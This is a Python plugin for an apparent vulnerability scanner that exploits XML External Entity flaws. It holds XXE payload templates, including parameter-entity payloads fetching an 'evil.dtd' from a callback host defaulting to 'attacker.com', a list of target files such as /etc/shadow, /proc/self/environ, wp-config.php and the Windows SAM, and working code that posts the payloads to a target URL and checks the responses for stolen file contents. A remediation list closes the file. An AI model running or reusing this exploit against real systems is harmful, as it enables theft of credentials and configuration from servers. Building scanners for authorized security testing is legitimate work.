"""
XXE (XML External Entity) Exploit Plugin

This plugin provides exploit capabilities for XXE vulnerabilities including:
- File extraction via XXE
- Out-of-band (OOB) XXE exploitation  
- Blind XXE techniques
- DTD-based attacks
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging
import re

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

logger = logging.getLogger(__name__)


class XXEPlugin(ExploitPlugin):
    """
    XXE exploit plugin.
    
    This plugin provides XXE exploitation capabilities including:
    - Local file extraction
    - Out-of-band XXE attacks
    - Blind XXE exploitation
    - DTD-based exploitation
    """
    
    # Files to extract via XXE
    TARGET_FILES = {
        'linux': [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/group',
            '/etc/shadow',
            '/proc/self/environ',
            '/var/www/html/config.php',
            '/var/www/html/wp-config.php',
        ],
        'windows': [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
            'C:\\Windows\\System32\\config\\SAM',
        ]
    }
    
    # XXE payload templates
    XXE_TEMPLATES = {
        'file_read': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>''',
        
        'parameter_entity': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&xxe;</root>''',
        
        'base64': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&xxe;</root>''',
    }
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'xxe'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'XXE Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'XML External Entity exploit plugin for extracting files and '
            'performing out-of-band attacks via XML parsing vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate XXE payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_file: File to extract (e.g., /etc/passwd)
                    - target_os: Target operating system (linux, windows)
                    - callback_server: Out-of-band callback server
        
        Returns:
            List of XXE payload strings
        """
        context = context or {}
        target_file = context.get('target_file', '/etc/passwd')
        callback_server = context.get('callback_server', 'attacker.com')
        
        payloads = []
        
        # Generate file read payloads
        payloads.append(self.XXE_TEMPLATES['file_read'].format(file_path=target_file))
        
        # Generate parameter entity payloads
        if callback_server != 'attacker.com':
            payloads.append(self.XXE_TEMPLATES['parameter_entity'].format(
                file_path=target_file,
                callback_server=callback_server
            ))
        
        # Generate base64 encoded payloads (for PHP)
        payloads.append(self.XXE_TEMPLATES['base64'].format(
            file_path=target_file,
            callback_server=callback_server
        ))
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute XXE exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - extracted_files: Dict of successfully extracted files
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'xxe',
            }
        
        config = config or {}
        
        logger.info(f"Attempting XXE exploitation on {target_url}")
        
        # Try to extract files
        exploitation_result = self._attempt_file_extraction(target_url, config)
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited XXE on {target_url}")
            return {
                'success': True,
                'extracted_files': exploitation_result.get('files', {}),
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'xxe',
                'message': f'Successfully extracted {len(exploitation_result.get("files", {}))} file(s)',
            }
        else:
            logger.info(f"XXE exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': exploitation_result.get('error', 'Could not extract files'),
                'message': 'XXE exploitation attempt was unsuccessful',
                'vulnerability_type': 'xxe',
            }
    
    def _attempt_file_extraction(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract files via XXE.
        
        Returns:
            Dict with success status and extracted files
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        extracted_files = {}
        
        headers = {'Content-Type': 'application/xml'}
        
        # Try Linux files
        logger.info("Attempting to extract Linux files...")
        for target_file in self.TARGET_FILES['linux'][:4]:  # Try first 4
            result = self._try_extract_file(url, target_file, headers, verify_ssl, timeout)
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        # Try Windows files
        logger.info("Attempting to extract Windows files...")
        for target_file in self.TARGET_FILES['windows'][:2]:  # Try first 2
            result = self._try_extract_file(url, target_file, headers, verify_ssl, timeout)
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        if extracted_files:
            return {
                'success': True,
                'files': extracted_files,
                'evidence': f'Extracted {len(extracted_files)} file(s): {", ".join(extracted_files.keys())}'
            }
        else:
            return {
                'success': False,
                'error': 'Could not extract any files via XXE'
            }
    
    def _try_extract_file(self, url: str, target_file: str, headers: Dict,
                         verify_ssl: bool, timeout: int) -> Dict[str, Any]:
        """
        Try to extract a specific file via XXE.
        
        Returns:
            Dict with success status and file content
        """
        # Generate payload
        payload = self.XXE_TEMPLATES['file_read'].format(file_path=target_file)
        
        try:
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl
            )
            
            # Check if file content is in response
            if self._verify_file_content(response.text, target_file):
                return {
                    'success': True,
                    'content': response.text[:1000],  # First 1000 chars
                }
        
        except Exception as e:
            logger.debug(f"Error extracting {target_file}: {e}")
        
        return {
            'success': False,
            'error': f'Could not extract {target_file}'
        }
    
    def _verify_file_content(self, content: str, target_file: str) -> bool:
        """Verify if the content contains expected file signatures."""
        # passwd file
        if 'passwd' in target_file:
            return bool(re.search(r'root:.*:0:0', content) or 
                       re.search(r'daemon:', content))
        
        # hosts file
        if 'hosts' in target_file.lower():
            return bool(re.search(r'127\.0\.0\.1', content) or
                       'localhost' in content.lower())
        
        # win.ini
        if 'win.ini' in target_file:
            return bool('[fonts]' in content.lower() or 
                       '[extensions]' in content.lower())
        
        # shadow file
        if 'shadow' in target_file:
            return bool('$' in content and ':' in content)
        
        # Generic check - if response contains XML-like data with file content
        if len(content) > 10 and not content.startswith('<!DOCTYPE html'):
            return True
        
        return False
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for XXE vulnerabilities."""
        return 'critical'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for XXE vulnerabilities."""
        return (
            'Prevent XXE attacks:\n'
            '1. Disable XML external entity processing in all XML parsers\n'
            '2. Use safe XML parsers with XXE disabled by default\n'
            '3. Disable DTD processing if not required\n'
            '4. Use JSON instead of XML where possible\n'
            '5. Keep XML processors and libraries updated\n'
            '6. Implement strict input validation and sanitization\n'
            '7. Use less complex data formats when XML is not required\n'
            '8. Implement network egress filtering\n'
            '9. Use XML security libraries and validators\n'
            '10. Apply principle of least privilege to file access'
        )
